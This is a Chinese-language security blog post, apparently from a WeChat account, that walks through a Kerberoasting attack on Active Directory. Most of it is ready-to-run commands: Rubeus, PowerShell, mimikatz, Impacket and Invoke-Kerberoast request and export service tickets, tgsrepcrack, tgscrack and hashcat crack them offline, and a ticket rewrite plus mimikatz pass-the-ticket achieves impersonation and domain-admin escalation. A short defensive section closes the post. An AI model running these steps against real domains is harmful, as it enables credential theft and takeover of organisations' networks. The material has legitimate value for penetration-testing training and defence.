> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488972&idx=1&sn=87a6d987de72a03a2710f162170cd3a0&chksm=fc781111cb0f98070f74377f8348c529699a5eea8497fd40d254cf37a1f54f96632da6a96d83&scene=21#wechat_redirect)

作者：谢公子

  

CSDN 安全博客专家，擅长渗透测试、Web 安全攻防、红蓝对抗。其自有公众号：谢公子学安全

免责声明：本公众号发布的文章均转载自互联网或经作者投稿授权的原创，文末已注明出处，其内容和图片版权归原网站或作者本人所有，并不代表安全 + 的观点，若有无意侵权或转载不当之处请联系我们处理，谢谢合作！

**欢迎各位添加微信号：qinchang_198231** 

**加入安全 + 交流群 和大佬们一起交流安全技术**

**Kerberoast 攻击**

kerberoast 攻击发生在 kerberos 协议的 TGS_REP 阶段，关于 kerberos 协议详情，传送门：[内网渗透 | 域内认证之 Kerberos 协议详解](http://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247484272&idx=1&sn=aed485eb96d5a17b2fc57207b8095f67&chksm=eaad834dddda0a5bbef03eaf76a31ca15277ca79d77f865392aabef7844c324f53af3402ac51&scene=21#wechat_redirect)

**Kerberoast 攻击过程：**

1. 攻击者对一个域进行身份验证，然后从域控制器获得一个 TGT 认购权证 ，该 TGT 认购权证用于以后的 ST 服务票据请求。

2. 攻击者使用他们的 TGT 认购权证 发出 ST 服务票据请求 (TGS-REQ) 获取特定形式（name/host）的 servicePrincipalName (SPN)。例如：MSSqlSvc/SQL.domain.com。此 SPN 在域中应该是唯一的，并且在用户或计算机帐户的 servicePrincipalName 字段中注册。在服务票证请求(TGS-REQ) 过程中，攻击者可以指定它们支持的 Kerberos 加密类型(RC4_HMAC，AES256_CTS_HMAC_SHA1_96 等等)。

3. 如果攻击者的 TGT 是有效的，则 DC 将从 TGT 认购权证 中提取信息并填充到 ST 服务票据中。然后，域控制器查找哪个帐户在 ServicedPrincipalName 字段中注册了所请求的 SPN。ST 服务票据使用注册了所要求的 SPN 的帐户的 NTLM 哈希进行加密, 并使用攻击者和服务帐户共同商定的加密算法。ST 服务票据以服务票据回复 (TGS-REP) 的形式发送回攻击者。

4. 攻击者从 TGS-REP 中提取加密的服务票证。由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码。

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNWCrTmibYOEbZYZw62bnaUYJIcAFqjIHfc1SxTZ9AW9bc5GTp2UK3DYg/640?wx_fmt=gif)

  

**SPN 服务主体名称的发现**

[传送门：域渗透之 SPN 服务主体名称](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488936&idx=1&sn=82c127c8ad6d3e36f1a977e5ba122228&chksm=fc781175cb0f986392b4c78112dcd01bf5c71e7d6bdc292f0d8a556cc27e6bd8ebc54278165d&scene=21#wechat_redirect)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNWCrTmibYOEbZYZw62bnaUYJIcAFqjIHfc1SxTZ9AW9bc5GTp2UK3DYg/640?wx_fmt=gif)

  

**请求服务票据**

使用 Rubeus 请求

  

Rubeus 里面的 kerberoast 支持对所有用户或者特定用户执行 kerberoasting 操作，其原理在于先用 LDAP 查询于内的 spn，再通过发送 TGS 包，然后直接打印出能使用 hashcat 或 john 爆破的 Hash。 以下的命令会打印出注册于用户下的所有 SPN 的服务票据的 hashcat 格式。

```
Rubeus.exe kerberoast
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnN45zgs4ibRBhCRrT1h74a1TENA8XmWviaxyKbd4vytEx52iazKibNxsmvEw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNoOl6kbTicibibESXNE3nsFKH6C162icB6pPEMh9Q6SgZjIcBDViabzicUQxw/640?wx_fmt=png)

powershell 命令请求

  

请求指定 SPN 的服务票据

```
#请求服务票据
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MySQL/win7.xie.com:3306/MySQL"
#列出服务票据
klist
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNicZyAlJgc2PibMQZG7sNZsu51yev7tq2gNs5lMSv4lP1hBJndT9Zg17w/640?wx_fmt=png)

mimikatz 请求

  

请求指定 SPN 的服务票据

```
#请求服务票据
kerberos::ask /target:MySQL/win7.xie.com:3306 
#列出服务票据
kerberos::list  
#清除所有票据
kerberos::purge
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNgy4NyLPjaVamLWWmrZtUuTrTqbhqgGicHccE2rBhDZDsrq5LfMA75FA/640?wx_fmt=png)

Impacket 中的 GetUserSPNS.py 请求

  

该脚本可以请求注册于用户下的所有 SPN 的服务票据。使用该脚本需要提供域账号密码才能查询。该脚本直接输出 hashcat 格式的服务票据，可用 hashcat 直接爆破。

```
./GetUserSPNs.py -request -dc-ip 192.168.10.131 xie.com/hack
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNDQQjFibBRV94bOxEwhZUxdrzmIicU2heKqlWxAyzNaU5QJEUibh9Brhibw/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNWCrTmibYOEbZYZw62bnaUYJIcAFqjIHfc1SxTZ9AW9bc5GTp2UK3DYg/640?wx_fmt=gif)

  

**导出服务票据**

先查看票据

  

可以使用以下的命令

```
klist
或
mimikatz.exe "kerberos::list"

MSF里面
load kiwi
kerberos_ticket_list
或
load kiwi
kiwi_cmd kerberos::list
```

  

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNFL3F4FrpMicKWeLjPuT2PzVsR108QrJ6HaXFCVE5ibkPW9wwbribXH6Cg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNkhAER8IWHShYrd9Zc2J7LVISyAuVcSC90zWeKFBOK92dqzoX0nYqDA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNg1as9Zx1WJagKjEjicsWicKgGHsgKGBTQicSUHgcGWWmnIibRezv2gDickg/640?wx_fmt=png)

mimikatz 导出

  

```
mimikatz.exe "kerberos::list /export" "exit"
```

执行完后，会在 mimikatz 同目录下导出 后缀为 kirbi 的票据文件

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNuy4TCibXWJVham6fUjUJvNZEwgfUDyhsmYoj3hTz2ZSaCicibfvf8xxZQ/640?wx_fmt=png)

Empire 下的 Invoke-Kerberoast.ps1

  

导出 Hashcat 格式的票据

```
Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNeGVU1R94958Mnyicjc5c1l01ZwTHiaibSicmfdgLNncfFUE7FMyGwfIzBA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNWCrTmibYOEbZYZw62bnaUYJIcAFqjIHfc1SxTZ9AW9bc5GTp2UK3DYg/640?wx_fmt=gif)

  

**离线破解服务票据**

kerberoast 中的 tgsrepcrack.py

  

```
python2 tgsrepcrack.py password.txt xx.kirbi
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnN1VlrBODPklwUUlKYuTrQR534HgEYCSichq6v9ceq0q0tibrvmU4OFuGA/640?wx_fmt=png)

tgscrack

  

```
python2 extractServiceTicketParts.py 1-40a00000-hack\@MySQL~win7.xie.com~3306~MySQL-XIE.COM.kirbi > hash.txt
go run tgscrack.go -hashfile hash.txt -wordlist password.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNibr2o4JicdfWmuAADB2FxUNt50RmbBrjlwVuj4aCmUnO8V0uibMwF4fGA/640?wx_fmt=png)

Hashcat

  

将导出的 hashcat 格式的哈希保存为 hash.txt 文件，放到 hashcat 的目录下

```
hashcat64.exe -m  13100  hash.txt  pass.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNhVBmIxEVCH80Rcn1DUB8uicnYBMcNiaMMUvoysnPKwibg7U8nLLFyaprQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnN2mHsEgxuefSRBebOrgiaf8GOpfDWCZGYCwzrmYtvuDN51ZLtdlg1ibxw/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNWCrTmibYOEbZYZw62bnaUYJIcAFqjIHfc1SxTZ9AW9bc5GTp2UK3DYg/640?wx_fmt=gif)

  

**服务票据重写 & RAM 注入**

ST 票据使用服务密码的 NTLM 哈希签名。如果票据散列已被破解，那么可以使用 Kerberoast python 脚本重写票据。这将允许在服务被访问时模拟任何域用户或伪造账户。此外，提权也是可能的，因为用户可以被添加到诸如域管理员的高权限组中。

```
python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500
python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512
```

使用以下 Mimikatz 命令将新票据重新注入内存，以便通过 Kerberos 协议对目标服务执行身份验证。

```
kerberos::ptt PENTESTLAB.kirbi
```

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNWCrTmibYOEbZYZw62bnaUYJIcAFqjIHfc1SxTZ9AW9bc5GTp2UK3DYg/640?wx_fmt=gif)

  

**Kerberoast 攻击防范**

*   确保服务账号密码为强密码 (长度、随机性、定期修改)
    
*   如果攻击者无法将默认的 AES256_HMAC 加密方式改为 RC4_HMAC_MD5，就无法实验 tgsrepcrack.py 来破解密码。
    
*   攻击者可以通过嗅探的方法抓取 Kerberos TGS 票据。因此，如果强制实验 AES256_HMAC 方式对 Kerberos 票据进行加密，那么，即使攻击者获取了 Kerberos 票据，也无法将其破解，从而保证了活动目录的安全性。
    
*   许多服务账户在内网中被分配了过高的权限，且密码强度较差。攻击者很可能通过破解票据的密码，从域用户权限提升到域管理员权限。因此，应该对服务账户的权限进行适当的配置，并提高密码的强度。
    
*   在进行日志审计时，可以重点关注 ID 为 4679(请求 Kerberos 服务票据) 的时间。如果有过多的 4769 日志，应进一步检查系统中是否存在恶意行为。
    

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNbGAB1U4tJaskHwMvoqDm8usHK4klz6QJyaYJQ5qveaukj9PUuYLxbQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnNKz0L4AJicKeAOqDRzT0h86OFKbToVlpicWKxsiaEHo9icWcCvf4Vd1p2gA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFgYb6xKr3EY5fvAvDj61qnN3RxtNlaqQTWQLf8eQWbuIicnnJXQPyD9IfPuu67GQtM8bvkzO96W4Yg/640?wx_fmt=png)

[内网渗透（三） | 域渗透之 SPN 服务主体名称](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488936&idx=1&sn=82c127c8ad6d3e36f1a977e5ba122228&chksm=fc781175cb0f986392b4c78112dcd01bf5c71e7d6bdc292f0d8a556cc27e6bd8ebc54278165d&scene=21#wechat_redirect)

[内网渗透（二） | MSF 和 CobaltStrike 联动](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488905&idx=2&sn=6e15c9c5dd126a607e7a90100b6148d6&chksm=fc781154cb0f98421e25a36ddbb222f3378edcda5d23f329a69a253a9240f1de502a00ee983b&scene=21#wechat_redirect)  

[内网渗透（一） | 搭建域环境](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488866&idx=2&sn=89f9ca5dec033f01e07d85352eec7387&chksm=fc7811bfcb0f98a9c2e5a73444678020b173364c402f770076580556a053f7a63af51acf3adc&scene=21#wechat_redirect)

[内网渗透 | 域内认证之 Kerberos 协议详解](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488900&idx=3&sn=dc2689efec7757f7b432e1fb38b599d4&chksm=fc781159cb0f984f1a44668d9e77d373e4b3bfa25e5fcb1512251e699d17d2b0da55348a2210&scene=21#wechat_redirect)